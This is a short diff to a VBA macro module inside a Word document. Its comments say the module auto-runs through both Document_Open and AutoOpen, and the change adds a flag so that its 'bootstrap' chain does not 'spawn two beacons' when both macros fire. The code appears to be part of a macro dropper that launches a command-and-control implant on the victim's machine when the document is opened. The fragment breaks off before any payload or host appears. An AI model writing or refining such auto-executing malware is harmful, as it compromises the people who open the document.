@@ -11,9 +11,15 @@ Attribute VB_Name = "c0015Entry"
 '
 ' Word auto-execution: both Document_Open and AutoOpen call the same
 ' entry so the document runs whichever auto macro Word recognizes on
-' the installed build.
+' the installed build. A module-level flag prevents the chain from
+' starting twice within one open (both auto macros firing would
+' otherwise spawn two beacons).
 ' ============================================================
+Private m_bootstrapStarted As Boolean
+
 Private Sub RunEntry()
+    If m_bootstrapStarted Then Exit Sub
+    m_bootstrapStarted = True
     On Error GoTo FailSafe
 
     Dim fso As Object
